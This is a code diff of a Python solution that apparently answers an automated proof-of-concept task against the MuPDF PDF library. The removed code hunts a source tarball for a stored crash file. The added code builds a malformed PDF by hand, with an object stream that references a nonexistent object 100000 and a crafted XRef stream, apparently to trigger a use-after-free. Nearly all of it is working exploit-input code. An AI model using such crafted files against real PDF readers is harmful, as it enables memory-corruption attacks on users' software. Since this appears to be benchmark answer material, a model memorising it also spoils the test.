@@ -1,179 +1,160 @@
 import os
-import tarfile
-import tempfile
-import gzip
-import bz2
-import lzma
-
-def _is_within_directory(directory, target):
-    abs_directory = os.path.abspath(directory)
-    abs_target = os.path.abspath(target)
-    return os.path.commonprefix([abs_directory, abs_target]) == abs_directory
-
-def _safe_extract(tar, path):
-    for member in tar.getmembers():
-        member_path = os.path.join(path, member.name)
-        if not _is_within_directory(path, member_path):
-            continue
-        try:
-            tar.extract(member, path)
-        except Exception:
-            continue
-
-def _read_prefix(path, max_bytes=16):
-    try:
-        with open(path, 'rb') as f:
-            return f.read(max_bytes)
-    except Exception:
-        return b''
-
-def _read_decompressed_prefix(path, ext, max_bytes=16):
-    try:
-        if ext == '.gz':
-            with gzip.open(path, 'rb') as f:
-                return f.read(max_bytes)
-        elif ext == '.bz2':
-            with bz2.open(path, 'rb') as f:
-                return f.read(max_bytes)
-        elif ext == '.xz' or ext == '.lzma':
-            with lzma.open(path, 'rb') as f:
-                return f.read(max_bytes)
-    except Exception:
-        return b''
-    return b''
-
-def _read_full(path):
-    with open(path, 'rb') as f:
-        return f.read()
-
-def _read_full_decompressed(path, ext):
-    if ext == '.gz':
-        with gzip.open(path, 'rb') as f:
-            return f.read()
-    elif ext == '.bz2':
-        with bz2.open(path, 'rb') as f:
-            return f.read()
-    elif ext == '.xz' or ext == '.lzma':
-        with lzma.open(path, 'rb') as f:
-            return f.read()
-    else:
-        return _read_full(path)
-
-def _score_candidate(path, file_size, goal_size=6431):
-    name = os.path.basename(path).lower()
-    parts = path.lower().split(os.sep)
-    ext = os.path.splitext(name)[1].lower()
-    score = 0
-
-    # Extension weights
-    if ext == '.pdf':
-        score += 600
-    elif ext in ('.gz', '.bz2', '.xz', '.lzma'):
-        score += 300
-    elif ext in ('.bin', '.raw', '.data'):
-        score += 120
-    elif ext in ('.in', '.inp', '.case', '.crash'):
-        score += 80
-
-    # Name / path hints
-    hints = [
-        'poc', 'uaf', 'use-after', 'use_after', 'after', 'free', 'heap',
-        'xref', 'xref_entry', 'objstm', 'object', 'solid', 'solidify',
-        'repair', 'cache', 'entry', 'pdf', 'mupdf', 'mutool', 'clusterfuzz',
-        'minimized', 'oss-fuzz', 'asan', 'ubsan', 'crash', 'repro', 'id:',
-        'cve', 'arvo', '59207'
-    ]
-    for h in hints:
-        if h in name:
-            score += 40
-    for segment in parts:
-        for h in ('poc', 'pocs', 'crash', 'crashes', 'fuzz', 'fuzzer', 'repro', 'tests', 'testcases', 'artifacts'):
-            if h in segment:
-                score += 30
-
-    # Size proximity
-    diff = abs(file_size - goal_size)
-    if diff == 0:
-        score += 1000
-    else:
-        # Closer sizes get more points; up to ~300 for very close
-        closeness = max(0, 300 - int(diff / 4))
-        score += closeness
-
-    # Header check
-    header = _read_prefix(path, 8)
-    if header.startswith(b'%PDF-'):
-        score += 800
-
-    # Compressed header check
-    if not header.startswith(b'%PDF-') and ext in ('.gz', '.bz2', '.xz', '.lzma'):
-        dhead = _read_decompressed_prefix(path, ext, 8)
-        if dhead.startswith(b'%PDF-'):
-            score += 700
-
-    # Penalize extremely large files
-    if file_size > 20 * 1024 * 1024:
-        score -= 200
-
-    return score
+from typing import List, Tuple
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tmpdir = tempfile.mkdtemp(prefix="src_extract_")
-        try:
-            # Extract tarball safely
-            try:
-                with tarfile.open(src_path, 'r:*') as tar:
-                    _safe_extract(tar, tmpdir)
-            except Exception:
-                # If extraction fails, return a minimal PDF (fallback)
-                return b'%PDF-1.4\n1 0 obj <<>> endobj\ntrailer <<>>\n%%EOF\n'
+        def obj_header(num: int, gen: int = 0) -> bytes:
+            return f"{num} {gen} obj\n".encode()
 
-            # Walk files and score candidates
-            best_path = None
-            best_score = -10**9
-            best_ext = ''
-            best_size = 0
+        def obj_footer() -> bytes:
+            return b"\nendobj\n"
 
-            for root, dirs, files in os.walk(tmpdir):
-                for fname in files:
-                    fpath = os.path.join(root, fname)
-                    try:
-                        if not os.path.isfile(fpath):
-                            continue
-                        size = os.path.getsize(fpath)
-                    except Exception:
-                        continue
+        # Build object stream (1 0 obj)
+        # Contains two objects: 2 0 and 100000 0
+        obj2_body = (
+            b"<< /Type /Font /Subtype /Type1 /Name /F1 /BaseFont /Helvetica"
+            b" /Encoding 100000 0 R /ToUnicode 100000 0 R >>"
+        )
+        obj100000_body = b"<<>>"
 
-                    # Skip extremely tiny files
-                    if size == 0:
-                        continue
-                    # Limit to 50MB to avoid huge data
-                    if size > 50 * 1024 * 1024:
-                        continue
+        # Index: pairs of "objnum offset"
+        # Offsets are measured from after the index (i.e., beginning of concatenated objects data)
+        # Place obj2 at offset 0, and obj100000 right after obj2 (plus a newline between them)
+        sep_between_objs = b"\n"
+        offset_obj2 = 0
+        offset_obj100000 = len(obj2_body) + len(sep_between_objs)
+        index_str = f"2 {offset_obj2} 100000 {offset_obj100000}\n".encode()
+        first_val = len(index_str)
 
-                    score = _score_candidate(fpath, size, 6431)
-                    if score > best_score:
-                        best_score = score
-                        best_path = fpath
-                        best_ext = os.path.splitext(fname)[1].lower()
-                        best_size = size
+        objstm_content = index_str + obj2_body + sep_between_objs + obj100000_body
+        objstm_length = len(objstm_content)
 
-            if best_path:
-                # Read content (decompress if needed)
-                if best_ext in ('.gz', '.bz2', '.xz', '.lzma'):
-                    try:
-                        data = _read_full_decompressed(best_path, best_ext)
-                        if data:
-                            return data
-                    except Exception:
-                        pass
-                try:
-                    data = _read_full(best_path)
-                    if data:
-                        return data
-                except Exception:
-                    pass
+        obj1 = (
+            obj_header(1) +
+            b"<< /Type /ObjStm /N 2 /First " + str(first_val).encode() +
+            b" /Length " + str(objstm_length).encode() + b" >>\n" +
+            b"stream\n" +
+            objstm_content + b"\n" +
+            b"endstream" +
+            obj_footer()
+        )
 
-            # Fallback minimal valid PDF
-            return b'%PDF-1.7\n% PoC fallback\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000010 00000 n \n0000000061 00000 n \n0000000128 00000 n \ntrailer\n<< /Root 1 0 R /Size 4 >>\nstartxref\n200\n%%EOF\n'
+        # Placeholder Info object 4 0
+        obj4 = obj_header(4) + b"<<>>" + obj_footer()
+
+        # Pages tree 5 0
+        obj5 = (
+            obj_header(5) +
+            b"<< /Type /Pages /Count 1 /Kids [6 0 R] >>" +
+            obj_footer()
+        )
+
+        # Page object 6 0
+        obj6 = (
+            obj_header(6) +
+            b"<< /Type /Page /Parent 5 0 R /Resources << /Font << /F1 2 0 R >> >> "
+            b"/MediaBox [0 0 200 200] /Contents 8 0 R >>" +
+            obj_footer()
+        )
+
+        # Catalog 7 0
+        obj7 = (
+            obj_header(7) +
+            b"<< /Type /Catalog /Pages 5 0 R >>" +
+            obj_footer()
+        )
+
+        # Contents 8 0
+        contents_stream = b"BT\n/F1 12 Tf\n72 720 Td\n(Hi) Tj\nET\n"
+        obj8 = (
+            obj_header(8) +
+            b"<< /Length " + str(len(contents_stream)).encode() + b" >>\n" +
+            b"stream\n" + contents_stream + b"endstream" +
+            obj_footer()
+        )
+
+        # PDF header
+        pdf_header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
+
+        # Assemble initial objects to compute offsets for xref
+        parts: List[Tuple[int, bytes]] = []
+        parts.append((0, pdf_header))  # special: 0 is header chunk; not an object
+
+        # Order of objects before xref:
+        # 1 0 obj (ObjStm)
+        # 4 0 obj
+        # 5 0 obj
+        # 6 0 obj
+        # 7 0 obj
+        # 8 0 obj
+        parts.append((1, obj1))
+        parts.append((4, obj4))
+        parts.append((5, obj5))
+        parts.append((6, obj6))
+        parts.append((7, obj7))
+        parts.append((8, obj8))
+
+        # Compute offsets
+        offsets = {}
+        cur = 0
+        for num, blob in parts:
+            if num != 0:
+                offsets[num] = cur
+            cur += len(blob)
+
+        # XRef stream (3 0 obj)
+        # Use W [1 4 4], Index [0 9) => 0..8 inclusive -> pair (0, 9)
+        # Size must be >= highest obj + 1 -> 9
+        # Entries type:
+        # 0: free
+        # 1: uncompressed at offset
+        # 2: compressed object (in object stream)
+        # We include entries for 0..8
+        def enc_entry(t: int, f2: int, f3: int) -> bytes:
+            return bytes([t]) + f2.to_bytes(4, "big") + f3.to_bytes(4, "big")
+
+        # We'll place xref after previous objects
+        off_xref = cur
+
+        # Build xref entries in order 0..8
+        xref_entries = []
+        # 0 free
+        xref_entries.append(enc_entry(0, 0, 0))
+        # 1 at offsets[1]
+        xref_entries.append(enc_entry(1, offsets[1], 0))
+        # 2 compressed in object stream 1 at index 0
+        xref_entries.append(enc_entry(2, 1, 0))
+        # 3 (xref itself) at off_xref (to be correct)
+        xref_entries.append(enc_entry(1, off_xref, 0))
+        # 4..8 regular
+        for i in range(4, 9):
+            xref_entries.append(enc_entry(1, offsets[i], 0))
+
+        xref_stream_data = b"".join(xref_entries)
+        xref_dict = (
+            b"<< /Type /XRef"
+            b" /W [1 4 4]"
+            b" /Index [0 9]"
+            b" /Size 9"
+            b" /Root 7 0 R"
+            b" /Length " + str(len(xref_stream_data)).encode() +
+            b" >>\n"
+        )
+        obj3 = (
+            obj_header(3) +
+            xref_dict +
+            b"stream\n" + xref_stream_data + b"\nendstream" +
+            obj_footer()
+        )
+
+        # Now assemble final file
+        final_parts: List[bytes] = []
+        for _, blob in parts:
+            final_parts.append(blob)
+        # Update of off_xref is already calculated (cur)
+        # Append xref object
+        final_parts.append(obj3)
+        # startxref points to off_xref
+        final_parts.append(b"startxref\n" + str(off_xref).encode() + b"\n%%EOF\n")
+
+        return b"".join(final_parts)
